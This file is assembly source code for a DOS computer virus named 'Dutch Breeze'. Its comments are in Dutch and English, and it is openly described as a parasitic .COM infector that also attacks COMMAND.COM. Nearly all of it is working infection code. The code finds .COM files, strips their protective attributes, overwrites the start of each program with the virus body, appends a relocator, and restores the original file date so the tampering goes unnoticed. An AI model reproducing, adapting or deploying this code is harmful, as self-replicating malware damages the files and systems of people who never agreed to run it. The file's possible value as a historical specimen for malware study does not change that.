;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                      Dutche Breeze by Glenn Benton                          ³
;ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;³ This will be a Parasytic Non-Resident .COM infector.                        ³
;³ It will also infect COMMAND.COM.                                            ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
.MODEL TINY

Public          VirLen,MovLen

Code            Segment para 'Code'
Assume          Cs:Code,Ds:Code,Es:Code

		Org 100h

Signature       Equ 0CaDah      ; Signature of virus is ABCD!

Buff1           Equ 0F100h
Buff2           Equ Buff1+2
VirLen          Equ Offset Einde-Offset Begin
MovLen          Equ Offset Einde-Offset Mover
DTA             Equ 0F000h
Proggie         Equ DTA+1Eh
Lenny           Equ DTA+1Ah

MinLen          Equ Virlen   ;Minimale lengte te besmetten programma
MaxLen          Equ 0EF00h      ; Maximale lengte te besmetten programma

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This part will contain the actual virus code, for searching the
; next victim and infection of it.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Begin:
		Jmp Short OverSig       ; Sprong naar Oversig vanwege kenmerk
		DW Signature            ; Herkenningsteken virus
Oversig:
		Pushf                   ;------------------
		Push AX                 ; Alle registers opslaan voor
		Push BX                 ; later gebruik van het programma
		Push CX                 ;
		Push DX                 ;
		Push DS                 ;
		Push ES                 ;
		Push SS                 ;
		Push SI                 ;
		Push DI                 ;------------------
InfectPart:
		Mov AX,Sprong           ;------------------
		Mov Buf1,AX             ; Spronggegevens bewaren om
		Mov BX,Source           ; besmette programma te starten
		Mov Buf2,BX             ;------------------
		Mov AH,1Ah              ; DTA area instellen op
		Mov DX,DTA              ; $DTA area
		Int 21h                 ;------------------
Vindeerst:      Mov AH,4Eh              ; Zoeken naar 1e .COM file in directory
		Mov Cx,1                ;
		Lea DX,FindPath         ;
		Int 21h                 ;------------------
		Jnc KijkInfected        ; Geen gevonden, goto Afgelopen
		Jmp Afgelopen           ;------------------
KijkInfected:
		Mov DX,Cs:[Lenny]       ;------------------
		Cmp DX,MinLen           ; Kijken of programmalengte voldoet
		Jb  ZoekNext            ; aan de eisen van het virus
		Cmp DX,MaxLen           ;
		Ja  ZoekNext            ;------------------
On2:            Mov AH,3Dh              ; Zo ja , file openen en file handle
		Mov AL,2                ; opslaan
		Mov DX,Proggie          ;
		Int 21h                 ;
		Mov FH,AX               ;------------------
		Mov BX,AX               ;
		Mov AH,3Fh              ; Lezen 1e 4 bytes van een file met
		Mov CX,4                ; een mogelijk kenmerk van het virus
		Mov DX,Buff1            ;
		Int 21h                 ;------------------
Sluiten:        Mov AH,3Eh              ; File weer sluiten
		Int 21h                 ;------------------
		Mov AX,CS:[Buff2]       ; Vergelijken inhoud lokatie Buff1+2
		Cmp AX,Signature        ; met Signature. Niet gelijk : Zoeken op
		Jnz Infect              ; morgoth virus. Als bestand al besmet
ZoekNext:
		Mov AH,4Fh              ;------------------
		Int 21h                 ; Zoeken naar volgende .COM file
		Jnc KijkInfected        ; Geen gevonden, goto Afgelopen
		Jmp Afgelopen           ;------------------
		Db 'Dutch [Breeze] by Glenn Benton'
Infect:
		Mov DX,Proggie          ; beveiliging weghalen
		Mov AH,43h              ;
		Mov AL,1                ;
		Xor CX,Cx
		Int 21h                 ;------------------
		Mov AH,3Dh              ; Bestand openen
		Mov AL,2                ;
		Mov DX,Proggie          ;
		Int 21h                 ;------------------
		Mov FH,AX               ; Opslaan op stack van
		Mov BX,AX               ; datum voor later gebruik
		Mov AH,57H              ;
		Mov AL,0                ;
		Int 21h                 ;
		Push CX                 ;
		Push DX                 ;------------------
		Mov AH,3Fh              ; Inlezen van eerste deel van het
		Mov CX,VirLen+2         ; programma om later terug te
		Mov DX,Buff1            ; kunnen plaatsen.
		Int 21h                 ;------------------
		Mov AH,42H              ; File Pointer weer naar het
		Mov AL,2                ; einde van het programma
		Xor CX,CX               ; zetten
		Xor DX,DX               ;
		Int 21h                 ;------------------
		Xor DX,DX               ; Bepalen van de variabele sprongen
		Add AX,100h             ; in het virus (move-routine)
		Mov Sprong,AX           ;
		Add AX,MovLen           ;
		Mov Source,AX           ;------------------
		Mov AH,40H              ; Move routine bewaren aan
		Mov DX,Offset Mover     ; einde van file
		Mov CX,MovLen           ;
		Int 21h                 ;------------------
		Mov AH,40H              ; Eerste deel programma aan-
		Mov DX,Buff1            ; voegen na Move routine
		Mov CX,VirLen           ;
		Int 21h                 ;------------------
		Mov AH,42h              ; File Pointer weer naar
		Mov AL,0                ; het begin van file
		Xor CX,CX               ; sturen
		Xor DX,DX               ;
		Int 21h                 ;------------------
		Mov AH,40h              ; En programma overschrijven
		Mov DX,Offset Begin     ; met code van het virus
		Mov CX,VirLen           ;
		Int 21h                 ;------------------
		Mov AH,57h              ; Datum van aangesproken file
		Mov AL,1                ; weer herstellen
		Pop DX                  ;
		Pop CX                  ;
		Int 21h                 ;------------------
		Mov AH,3Eh              ; Sluiten file
		Int 21h                 ;------------------
Afgelopen:      Mov BX,Buf2             ; Sprongvariabelen weer
		Mov Source,BX           ; op normaal zetten voor
		Mov AX,Buf1             ; de Move routine
		Mov Sprong,AX           ;------------------
		Mov AH,1Ah              ; DTA adres weer op normaal
		Mov Dx,80h              ; zetten en naar de Move
		Int 21h                 ; routine springen
		Jmp CS:[Sprong]         ;------------------

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; All variables are stored in here, like filehandle, date/time,
; search path and various buffers.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

FH              DW 0
FindPath        DB '*.COM',0

Buf1            DW 0
Buf2            DW 0

Sprong          DW 0
Source          DW 0

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; This will contain the relocator routine, located at the end of
; the ORIGINAL file. This will tranfer the 1st part of the program
; to it's original place.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Mover:
		Mov DI,Offset Begin     ;------------------
		Mov SI,Source           ; Verplaatsen van het 1e deel
		Mov CX,VirLen-1         ; van het programma, wat achter
		Rep Movsb               ;------------------
		Pop DI                  ; Opgeslagen registers weer
		Pop SI                  ; terugzetten op originele
		Pop SS                  ; waarde en springen naar
		Pop ES                  ; het begin van het programma
		Pop DS                  ; (waar nu het virus niet meer
		Pop DX                  ; staat)
		Pop CX                  ;
		Pop BX                  ;
		Pop AX                  ;
		Popf                    ;
		Mov BX,100h             ;
		Jmp BX                  ;------------------

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Only the end of the virus is stored in here.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Einde           db 0

Code            Ends
End             Begin

